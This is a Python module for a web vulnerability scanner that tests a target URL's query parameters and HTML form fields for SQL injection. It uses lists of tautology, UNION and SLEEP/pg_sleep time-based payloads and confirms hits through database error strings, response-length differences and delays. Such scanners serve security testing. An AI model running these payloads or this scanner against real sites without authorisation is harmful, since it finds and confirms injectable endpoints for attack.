import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import requests
from modules.init import Logger

BASIC_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "1' OR '1'='1' -- ",
    "1' OR 1=1#",
    "1' OR 'a'='a",
    "' OR 'x'='x",
    "1' UNION SELECT NULL,NULL -- ",
]

SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "mysql_fetch_array",
    "mysql_num_rows",
    "ORA-",
    "Warning: mysql",
    "You have an error in your SQL syntax",
    "PostgreSQL query failed",
    "SQLite error",
    "SequelizeDatabaseError",
    "Unknown column",
    "Invalid query",
    "SQLITE_ERROR",
    "sqlite3.OperationalError",
]

TIME_PAYLOADS = [
    "' OR SLEEP(3)-- ",
    "'; SELECT SLEEP(3); -- ",
    "'; SELECT pg_sleep(3); -- ",
]

class SQLInjectionScanner:
    def __init__(self, logger=None, http=None, delay_between_requests=0.5, time_threshold=2.5):
        self.logger = logger if logger is not None else Logger(verbosity=0)
        self.http = http
        self.delay = delay_between_requests
        self.time_threshold = time_threshold

    def scan(self, url: str):
        findings = []
        self.logger.info("Running SQLInjectionScanner...")
        findings.extend(self._test_query_params(url))
        r = self.http.get(url)
        if r and r.text:
            findings.extend(self._test_forms(url, r.text))
        else:
            self.logger.debug(f"No response or empty body for {url}")
        findings = self._deduplicate_findings(findings)
        return findings

    def _deduplicate_findings(self, findings):
        seen = set()
        unique_findings = []
        for finding in findings:
            key = (finding["url"], finding.get("param", ""), finding["type"], finding["location"])
            if key not in seen:
                seen.add(key)
                unique_findings.append(finding)
        return unique_findings

    def _test_query_params(self, url: str):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            self.logger.debug(f"No query params found in {url}")
            return findings

        baseline_resp = self.http.get(url)
        baseline_text = baseline_resp.text if baseline_resp else ""
        baseline_status = baseline_resp.status_code if baseline_resp else 200

        original_params = {k: list(v) for k, v in params.items()}

        for param in list(original_params.keys()):
            found_vuln = False
            for payload in BASIC_PAYLOADS:
                if found_vuln:
                    break
                new_params = {k: list(v) for k, v in original_params.items()}
                new_params[param] = [payload]
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse(
                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                )
                time.sleep(self.delay)
                try:
                    r = self.http.get(new_url, params=None)
                    if not r:
                        self.logger.debug(f"No response for {new_url}")
                        continue

                    if self._contains_sql_error(r.text):
                        findings.append({
                            "type": "SQL Injection",
                            "location": "query",
                            "url": new_url,
                            "method": "GET",
                            "param": param,
                            "payload": payload,
                            "evidence": self._extract_evidence(r.text, baseline_text, extra="error-based"),
                        })
                        found_vuln = True
                        break

                    if baseline_text and abs(len(r.text) - len(baseline_text)) > 100:
                        self.logger.debug("Length diff detected; attempting boolean confirmation")
                        if self._confirm_boolean(url, param, original_params):
                            findings.append({
                                "type": "SQL Injection",
                                "location": "query",
                                "url": new_url,
                                "method": "GET",
                                "param": param,
                                "payload": payload,
                                "evidence": self._extract_evidence(r.text, baseline_text, extra="boolean-confirmed"),
                            })
                            found_vuln = True
                            break
                        if self._confirm_time_based(parsed, param, original_params):
                            findings.append({
                                "type": "SQL Injection",
                                "location": "query",
                                "url": new_url,
                                "method": "GET",
                                "param": param,
                                "payload": payload,
                                "evidence": self._extract_evidence(r.text, baseline_text, extra="time-confirmed"),
                            })
                            found_vuln = True
                            break

                    self.logger.debug(f"No SQLi detected for {new_url} with payload {payload}")
                except Exception as e:
                    self.logger.error(f"GET {new_url} failed: {str(e)}")
                    self.logger.debug(f"No SQLi detected for {new_url} with payload {payload}")
        return findings

    def _test_forms(self, base_url: str, html: str):
        findings = []
        soup = BeautifulSoup(html, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            self.logger.debug("No forms found for SQLi analysis")
            return findings

        for form in forms:
            action = form.get("action") or base_url
            method = (form.get("method") or "get").upper()
            inputs = form.find_all(["input", "textarea"])
            baseline_data = {i.get("name"): "test" for i in inputs if i.get("name")}
            target_url = urljoin(base_url, action)
            self.logger.debug(f"Resolved baseline form action to {target_url}")
            if method == "POST":
                baseline_resp = self.http.post(target_url, data=baseline_data)
            else:
                baseline_resp = self.http.get(target_url, params=baseline_data)
            baseline_text = baseline_resp.text if baseline_resp else ""
            baseline_status = baseline_resp.status_code if baseline_resp else 200
            if not baseline_resp:
                self.logger.debug(f"Baseline request failed for {target_url}")
            else:
                self.logger.debug(f"Baseline response for {target_url}: OK")

            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                found_vuln = False
                for payload in BASIC_PAYLOADS:
                    if found_vuln:
                        break
                    data = {i.get("name"): "test" for i in inputs if i.get("name")}
                    data[name] = payload
                    target_url = urljoin(base_url, action)
                    self.logger.debug(f"Resolved form action to {target_url}")
                    time.sleep(self.delay)
                    try:
                        if method == "POST":
                            r = self.http.post(target_url, data=data)
                        else:
                            r = self.http.get(target_url, params=data)
                        if not r:
                            self.logger.debug(f"No response for form submit to {target_url}")
                            continue

                        if self._contains_sql_error(r.text):
                            findings.append({
                                "type": "SQL Injection",
                                "location": "form",
                                "url": target_url,
                                "method": method,
                                "param": name,
                                "payload": payload,
                                "evidence": self._extract_evidence(r.text, baseline_text, extra="error-based"),
                            })
                            found_vuln = True
                            break

                        if baseline_text and abs(len(r.text) - len(baseline_text)) > 100:
                            self.logger.debug("Length diff detected for form; attempting boolean confirmation")
                            if method == "POST" and self._confirm_boolean_form(target_url, inputs, name):
                                findings.append({
                                    "type": "SQL Injection",
                                    "location": "form",
                                    "url": target_url,
                                    "method": method,
                                    "param": name,
                                    "payload": payload,
                                    "evidence": self._extract_evidence(r.text, baseline_text, extra="boolean-confirmed"),
                                })
                                found_vuln = True
                                break
                            if method == "POST" and self._confirm_time_based_form(target_url, inputs, name):
                                findings.append({
                                    "type": "SQL Injection",
                                    "location": "form",
                                    "url": target_url,
                                    "method": method,
                                    "param": name,
                                    "payload": payload,
                                    "evidence": self._extract_evidence(r.text, baseline_text, extra="time-confirmed"),
                                })
                                found_vuln = True
                                break

                        self.logger.debug(f"No SQLi detected for form {target_url} with payload {payload}")
                    except Exception as e:
                        self.logger.error(f"{method} {target_url} failed: {str(e)}")
                        self.logger.debug(f"No SQLi detected for {target_url} with payload {payload}")
        return findings

    def _contains_sql_error(self, text: str) -> bool:
        lower = text.lower()
        for err in SQL_ERRORS:
            if err.lower() in lower:
                self.logger.debug(f"SQL error pattern found: {err}")
                return True
        return False

    def _confirm_boolean(self, url, param, original_params) -> bool:
        parsed = urlparse(url)
        true_payloads = ["1' AND '1'='1", "1' OR '1'='1"]
        false_payloads = ["1' AND '1'='2", "1' AND 1=0"]
        for t, f in zip(true_payloads, false_payloads):
            params_true = {k: list(v) for k, v in original_params.items()}
            params_false = {k: list(v) for k, v in original_params.items()}
            params_true[param] = [t]
            params_false[param] = [f]
            q_true = urlencode(params_true, doseq=True)
            q_false = urlencode(params_false, doseq=True)
            u_true = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_true, parsed.fragment))
            u_false = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_false, parsed.fragment))
            try:
                r1 = self.http.get(u_true, params=None)
                r2 = self.http.get(u_false, params=None)
                if not r1 or not r2:
                    continue
                if r1.status_code != r2.status_code:
                    self.logger.debug("Boolean confirmation: differing status codes")
                    return True
                body1 = r1.text.strip()
                body2 = r2.text.strip()
                if abs(len(body1) - len(body2)) > 30:
                    self.logger.debug("Boolean confirmation: length difference")
                    return True
                if body1 != body2:
                    self.logger.debug("Boolean confirmation: body content differs")
                    return True
            except Exception as e:
                self.logger.debug(f"Boolean confirmation failed: {e}")
                continue
        return False

    def _confirm_time_based(self, parsed_url, param, original_params) -> bool:
        parsed = parsed_url
        for p in TIME_PAYLOADS:
            params_sleep = {k: list(v) for k, v in original_params.items()}
            params_sleep[param] = [p]
            q_sleep = urlencode(params_sleep, doseq=True)
            u_sleep = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_sleep, parsed.fragment))
            try:
                start = time.time()
                r = self.http.get(u_sleep, params=None)
                delta = time.time() - start
                self.logger.debug(f"time-based test delta={delta:.2f}s for payload {p}")
                if delta >= self.time_threshold:
                    return True
            except Exception:
                continue
        return False

    def _confirm_boolean_form(self, target_url, inputs, vulnerable_param) -> bool:
        names = [i.get("name") for i in inputs if i.get("name")]
        baseline = {n: "test" for n in names}
        t_payload = "1' AND '1'='1"
        f_payload = "1' AND '1'='2"
        true_data = dict(baseline)
        false_data = dict(baseline)
        true_data[vulnerable_param] = t_payload
        false_data[vulnerable_param] = f_payload
        try:
            r_true = self.http.post(target_url, data=true_data)
            r_false = self.http.post(target_url, data=false_data)
            if not r_true or not r_false:
                return False
            if r_true.status_code != r_false.status_code:
                return True
            b1 = r_true.text.strip()
            b2 = r_false.text.strip()
            if abs(len(b1) - len(b2)) > 30:
                return True
            if b1 != b2:
                return True
        except Exception:
            return False
        return False

    def _confirm_time_based_form(self, target_url, inputs, vulnerable_param) -> bool:
        names = [i.get("name") for i in inputs if i.get("name")]
        baseline = {n: "test" for n in names}
        for p in TIME_PAYLOADS:
            payload_data = dict(baseline)
            payload_data[vulnerable_param] = p
            try:
                start = time.time()
                r = self.http.post(target_url, data=payload_data)
                delta = time.time() - start
                self.logger.debug(f"time-based form test delta={delta:.2f}s for payload {p}")
                if delta >= self.time_threshold:
                    return True
            except Exception:
                continue
        return False

    def _extract_evidence(self, text: str, baseline_text: str = "", extra: str = "", context: int = 300) -> str:
        lower = text.lower()
        for err in SQL_ERRORS:
            idx = lower.find(err.lower())
            if idx != -1:
                start = max(0, idx - context)
                end = min(len(text), idx + len(err) + context)
                return f"{extra}: {text[start:end].replace(chr(10), ' ').replace(chr(13), ' ')}"
        if baseline_text:
            diff = len(text) - len(baseline_text)
            sample = text[:context].replace("\n", " ").replace("\r", " ")
            return f"{extra}: Blind/length-change sample (delta={diff} bytes): {sample}"
        return f"{extra}: {text[:context].replace(chr(10), ' ').replace(chr(13), ' ')}"
